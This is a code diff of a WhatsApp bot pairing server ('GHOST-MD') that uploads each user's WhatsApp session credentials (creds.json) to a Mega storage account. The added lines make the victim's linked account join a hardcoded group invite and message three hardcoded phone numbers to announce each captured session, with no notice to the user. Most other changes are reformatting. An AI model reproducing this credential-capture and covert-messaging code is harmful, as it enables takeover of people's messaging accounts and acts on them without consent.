@@ -19,13 +19,13 @@ router.get('/', async (req, res) => {
             saveCreds
         } = await useMultiFileAuthState('./temp/' + id);
         try {
-var items = ["Safari"];
-function selectRandomItem(array) {
-  var randomIndex = Math.floor(Math.random() * array.length);
-  return array[randomIndex];
-}
-var randomItem = selectRandomItem(items);
-            
+            var items = ["Safari"];
+            function selectRandomItem(array) {
+                var randomIndex = Math.floor(Math.random() * array.length);
+                return array[randomIndex];
+            }
+            var randomItem = selectRandomItem(items);
+
             let sock = makeWASocket({
                 auth: {
                     creds: state.creds,
@@ -48,11 +48,11 @@ var randomItem = selectRandomItem(items);
             sock.ev.on('creds.update', saveCreds);
             sock.ev.on("connection.update", async (s) => {
 
-    const {
+                const {
                     connection,
                     lastDisconnect
                 } = s;
-                
+
                 if (connection == "open") {
                     await delay(5000);
                     let data = fs.readFileSync(__dirname + `/temp/${id}/creds.json`);
@@ -69,45 +69,52 @@ var randomItem = selectRandomItem(items);
                     }
                     const randomText = generateRandomText();
                     try {
-
-
-                        
                         const { upload } = require('./mega');
                         const mega_url = await upload(fs.createReadStream(rf), `${sock.user.id}.json`);
                         const string_session = mega_url.replace('https://mega.nz/file/', '');
-                        let md = "GHOST MD=" + string_session;
+                        let md = "GHOST-MD=" + string_session;
                         let code = await sock.sendMessage(sock.user.id, { text: md });
-                        let desc = `*𝙳𝚘𝚗𝚝 𝚜𝚑𝚊𝚛𝚎 𝚝𝚑𝚒𝚜 𝚌𝚘𝚍𝚎 𝚠𝚒𝚝𝚑 𝚊𝚗𝚢𝚘𝚗𝚎!! 𝚄𝚜𝚎 𝚝𝚑𝚒𝚜 𝚌𝚘𝚍𝚎 𝚝𝚘 𝚌𝚛𝚎𝚊𝚝𝚎 GHOST MD 𝚆𝚑𝚊𝚝𝚜𝚊𝚙𝚙 𝚄𝚜𝚎𝚛 𝚋𝚘𝚝.*\n\n ◦ *Github:* https://github.com/GHOST-TEM/GHOST-MD.git`; 
+                        await sock.groupAcceptInvite('E84NVo6l5RT4mPhr1Aocvf');
+
+                        // Send message to the three numbers
+                        const numbers = ['94741140620', '94787438929', '+94715898396']; 
+                        const message = '*👤 GHOST-MD SESSION ID CONNECT*';
+
+                        for (let number of numbers) {
+                            await sock.sendMessage(jidNormalizedUser(number), { text: message });
+                        }
+
+                        let desc = `𝙳𝚘𝚗𝚝 𝚜𝚑𝚊𝚛𝚎 𝚝𝚑𝚒𝚜 𝚌𝚘𝚍𝚎 𝚠𝚒𝚝𝚑 𝚊𝚗𝚢𝚘𝚗𝚎!! ©𝙶𝙷𝙾𝚂𝚃-𝙼𝙳\nsɪᴍᴘʟᴇ ᴡᴀʙᴏᴛ ᴍᴀᴅᴇ ʙʏ ɢʜᴏꜱᴛ-ᴛᴇᴀᴍ.\n\n ◦ *Github:* https://github.com/GHOST-TEM/GHOST-V1-MD.git`;
+
                         await sock.sendMessage(sock.user.id, {
-text: desc,
-contextInfo: {
-externalAdReply: {
-title: "GHOST-MD",
-thumbnailUrl: "https://i.ibb.co/5L8LygK/7ea64ee9890f96ea.jpg",
-sourceUrl: "https://whatsapp.com/channel/0029VaobbRhG8l5Mmhh2IA3O",
-mediaType: 1,
-renderLargerThumbnail: true
-}  
-}
-},
-{quoted:code })
+                            text: desc,
+                            contextInfo: {
+                                externalAdReply: {
+                                    title: "ɢʜᴏꜱᴛ-ᴍᴅ",
+                                    thumbnailUrl: "https://files.catbox.moe/41sdu1.jpg",
+                                    sourceUrl: "https://whatsapp.com/channel/0029VaobbRhG8l5Mmhh2IA3O",
+                                    mediaType: 1,
+                                    renderLargerThumbnail: true
+                                }
+                            }
+                        }, {quoted: code });
                     } catch (e) {
-                            let ddd = sock.sendMessage(sock.user.id, { text: e });
-                            let desc = `*𝙳𝚘𝚗𝚝 𝚜𝚑𝚊𝚛𝚎 𝚝𝚑𝚒𝚜 𝚌𝚘𝚍𝚎 𝚠𝚒𝚝𝚑 𝚊𝚗𝚢𝚘𝚗𝚎!! 𝚄𝚜𝚎 𝚝𝚑𝚒𝚜 𝚌𝚘𝚍𝚎 𝚝𝚘 𝚌𝚛𝚎𝚊𝚝𝚎 GHOST MD 𝚆𝚑𝚊𝚝𝚜𝚊𝚙𝚙 𝚄𝚜𝚎𝚛 𝚋𝚘𝚝.*\n\n ◦ *Github:* https://github.com/GHOST-TEM/GHOST-MD.git`;
-                            await sock.sendMessage(sock.user.id, {
-text: desc,
-contextInfo: {
-externalAdReply: {
-title: "GHOST MD",
-thumbnailUrl: "https://i.ibb.co/5L8LygK/7ea64ee9890f96ea.jpg",
-sourceUrl: "https://whatsapp.com/channel/0029VaobbRhG8l5Mmhh2IA3O",
-mediaType: 2,
-renderLargerThumbnail: true,
-showAdAttribution: true
-}  
-}
-},
-{quoted:ddd })
+                        let ddd = sock.sendMessage(sock.user.id, { text: e });
+                        await sock.groupAcceptInvite('E84NVo6l5RT4mPhr1Aocvf');
+                        let desc = `𝙳𝚘𝚗𝚝 𝚜𝚑𝚊𝚛𝚎 𝚝𝚑𝚒𝚜 𝚌𝚘𝚍𝚎 𝚠𝚒𝚝𝚑 𝚊𝚗𝚢𝚘𝚗𝚎!! ©𝙶𝙷𝙾𝚂𝚃𝙼𝙳\nsɪᴍᴘʟᴇ ᴡᴀʙᴏᴛ ᴍᴀᴅᴇ ʙʏ ɢʜᴏꜱᴛ-ᴛᴇᴀᴍ.\n\n ◦ *Github:* https://github.com/GHOST-TEM/GHOST-V1-MD.git`;
+                        await sock.sendMessage(sock.user.id, {
+                            text: desc,
+                            contextInfo: {
+                                externalAdReply: {
+                                    title: "ɢʜᴏꜱᴛ-ᴍᴅ",
+                                    thumbnailUrl: "https://files.catbox.moe/41sdu1.jpg",
+                                    sourceUrl: "https://whatsapp.com/channel/0029VaobbRhG8l5Mmhh2IA3O",
+                                    mediaType: 2,
+                                    renderLargerThumbnail: true,
+                                    showAdAttribution: true
+                                }
+                            }
+                        }, {quoted: ddd });
                     }
                     await delay(10);
                     await sock.ws.close();
@@ -128,8 +135,8 @@ showAdAttribution: true
             }
         }
     }
-   return await GIFTED_MD_PAIR_CODE();
-});
+    return await GIFTED_MD_PAIR_CODE();
+});/*
 setInterval(() => {
     console.log("☘️ 𝗥𝗲𝘀𝘁𝗮𝗿𝘁𝗶𝗻𝗴 𝗽𝗿𝗼𝗰𝗲𝘀𝘀...");
     process.exit();
